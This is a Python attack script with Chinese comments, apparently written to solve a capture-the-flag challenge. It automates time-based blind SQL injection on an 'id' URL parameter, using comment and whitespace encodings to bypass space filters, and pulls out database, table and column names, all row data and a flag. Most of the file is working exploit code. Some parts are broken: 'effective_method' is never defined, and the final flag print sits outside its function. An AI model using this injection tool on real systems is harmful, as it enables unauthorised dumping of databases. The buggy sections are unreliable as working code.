#完整版有点问题，用简化版的就行
import requests
import time
import urllib.parse

# 目标URL
url = ""  # 替换为实际题目URL
id = ""

# 绕过空格过滤的方法
def bypass_space(payload):
    # 使用多种方法替代空格
    replacements = {
        " ": "/**/",  # MySQL注释符
        " ": "%09",  # 水平制表符
        " ": "%0a",  # 换行符
        " ": "%0b",  # 垂直制表符
        " ": "%0c",  # 换页符
        " ": "%0d",  # 回车符
        " ": "%a0",  # 非断行空格
    }

    # 优先使用/**/注释符，如果不行再尝试其他方法
    payload = payload.replace(" ", "/**/")
    return payload


# 时间盲注函数 - 通过响应时间判断条件真假
def time_based_injection(payload):
    # 绕过空格过滤
    payload = bypass_space(payload)

    start_time = time.time()
    try:
        # 发送请求，注意注入点参数是id
        response = requests.get(url, params={"id": payload}, timeout=10)
        elapsed_time = time.time() - start_time
        # 如果响应时间超过2秒，说明条件为真
        return elapsed_time > 2
    except:
        return False


# 获取字符串长度
def get_length(query):
    length = 0
    for i in range(1, 100):
        # 使用括号绕过空格
        payload = f"1/**/and/**/if(({query})={i},sleep(2),0)"
        if time_based_injection(payload):
            length = i
            break
    return length


# 逐字符获取数据
def get_data(query, length):
    result = ""
    for position in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            # 使用括号和注释符绕过空格
            payload = f"1/**/and/**/if(ascii(substr(({query}),{position},1))>{mid},sleep(2),0)"
            if time_based_injection(payload):
                low = mid + 1
            else:
                payload = f"1/**/and/**/if(ascii(substr(({query}),{position},1))={mid},sleep(2),0)"
                if time_based_injection(payload):
                    result += chr(mid)
                    print(f"当前进度: {result}")
                    break
                high = mid - 1
    return result

'''
# 测试哪种空格绕过方法有效
def test_bypass_methods():
    test_payloads = [
        "1/**/and/**/if(1=1,sleep(2),0)",  # 使用/**/
        "1%09and%09if(1=1,sleep(2),0)",  # 使用%09
        "1%0aand%0aif(1=1,sleep(2),0)",  # 使用%0a
        "1%0band%0bif(1=1,sleep(2),0)",  # 使用%0b
        "(1)and(if((1)=(1),sleep(2),0))",  # 使用括号
    ]

    for i, payload in enumerate(test_payloads):
        print(f"测试方法 {i + 1}: {payload}")
        start_time = time.time()
        try:
            response = requests.get(url, params={"id": payload}, timeout=10)
            elapsed_time = time.time() - start_time
            if elapsed_time > 2:
                print(f"方法 {i + 1} 有效!")
                return i
        except:
            continue

    print("所有方法都无效，尝试默认方法")
    return 0
    '''


# 改进的绕过空格函数
def bypass_space_advanced(payload, method=0):
    methods = [
        lambda p: p.replace(" ", "/**/"),  # 方法1: 使用/**/
        lambda p: p.replace(" ", "%09"),  # 方法2: 使用%09
        lambda p: p.replace(" ", "%0a"),  # 方法3: 使用%0a
        lambda p: p.replace(" ", "%0b"),  # 方法4: 使用%0b
        lambda p: p.replace(" ", "(").replace(" ", ")"),  # 方法5: 使用括号
    ]

    if method < len(methods):
        return methods[method](payload)
    else:
        return payload.replace(" ", "/**/")


# 主函数
def main():
    print("开始时间盲注攻击...")
    print("测试空格绕过方法...")

    # 测试哪种方法有效
    #effective_method = test_bypass_methods()

    # 更新绕过空格函数
    global bypass_space
    bypass_space = lambda p: bypass_space_advanced(p, effective_method)

    # 1. 获取当前数据库名
    print("\n[1] 获取当前数据库名...")
    db_length = get_length("select/**/length(database())")
    print(f"数据库名长度: {db_length}")
    database_name = get_data("select/**/database()", db_length)
    print(f"数据库名: {database_name}")

    # 2. 获取所有表名
    print("\n[2] 获取表名...")
    # 先获取表数量
    table_count_length = get_length(
        "select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema=database()")
    table_count = int(
        get_data("select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema=database()",
                 table_count_length))
    print(f"表数量: {table_count}")

    tables = []
    for i in range(table_count):
        table_length = get_length(
            f"select/**/length(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/{i},1")
        table_name = get_data(
            f"select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/{i},1",
            table_length)
        tables.append(table_name)
        print(f"表{i + 1}: {table_name}")

    # 3. 获取每个表的列名
    print("\n[3] 获取列名...")
    columns_info = {}
    for table in tables:
        print(f"获取表 {table} 的列信息...")
        # 获取列数量
        col_count_length = get_length(
            f"select/**/count(*)/**/from/**/information_schema.columns/**/where/**/table_name='{table}'/**/and/**/table_schema=database()")
        col_count = int(get_data(
            f"select/**/count(*)/**/from/**/information_schema.columns/**/where/**/table_name='{table}'/**/and/**/table_schema=database()",
            col_count_length))

        columns = []
        for j in range(col_count):
            col_length = get_length(
                f"select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='{table}'/**/and/**/table_schema=database()/**/limit/**/{j},1")
            col_name = get_data(
                f"select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='{table}'/**/and/**/table_schema=database()/**/limit/**/{j},1",
                col_length)
            columns.append(col_name)
            print(f"  列{j + 1}: {col_name}")

        columns_info[table] = columns

    # 4. 获取表数据
    print("\n[4] 获取数据内容...")
    for table, columns in columns_info.items():
        print(f"\n表 {table} 的数据:")

        # 获取行数
        row_count_length = get_length(f"select/**/count(*)/**/from/**/{table}")
        row_count = int(get_data(f"select/**/count(*)/**/from/**/{table}", row_count_length))
        print(f"行数: {row_count}")

        for row in range(row_count):
            print(f"第{row + 1}行数据:")
            row_data = {}
            for col in columns:
                # 获取数据长度
                data_length = get_length(f"select/**/length({col})/**/from/**/{table}/**/limit/**/{row},1")
                if data_length > 0:
                    data = get_data(f"select/**/{col}/**/from/**/{table}/**/limit/**/{row},1", data_length)
                    row_data[col] = data
                    print(f"  {col}: {data}")

            # 如果找到flag相关的数据，特别标注
            for key, value in row_data.items():
                if 'flag' in value.lower():
                    print(f"🚩 发现flag: {value}")


# 更简洁的版本（如果上面的太复杂）
def simple_version():
    print("使用简化版本（默认绕过空格方法）...")

    # 1. 获取当前数据库名
    print("\n[1] 获取当前数据库名...")
    db_length = get_length("select/**/length(database())")
    print(f"数据库名长度: {db_length}")
    database_name = get_data("select/**/database()", db_length)
    print(f"数据库名: {database_name}")

    # 2. 获取表名（假设只有一个表）
    print("\n[2] 获取第一个表名...")
    table_length = get_length(
        "select/**/length(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1")
    table_name = get_data(
        "select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1",
        table_length)
    print(f"表名: {table_name}")

    # 3. 获取列名（假设flag在某个列中）
    print("\n[3] 获取列名...")
    col_length = get_length(
        "select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='" + table_name + "'/**/limit/**/0,1")
    col_name = get_data(
        "select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='" + table_name + "'/**/limit/**/0,1",
        col_length)
    print(f"第一个列名: {col_name}")

    # 4. 获取flag
    print("\n[4] 获取flag...")
    flag_length = get_length(f"select/**/length({col_name})/**/from/**/{table_name}/**/limit/**/0,1")
    flag = get_data(f"select/**/{col_name}/**/from/**/{table_name}/**/limit/**/0,1", flag_length)
print(f"🚩 Flag: {flag}")


if __name__ == "__main__":
    # 可以选择使用完整版本或简化版本
    use_simple = input("使用简化版本？(y/n): ").lower().startswith('y')

    if use_simple:
        simple_version()
    else:
        main()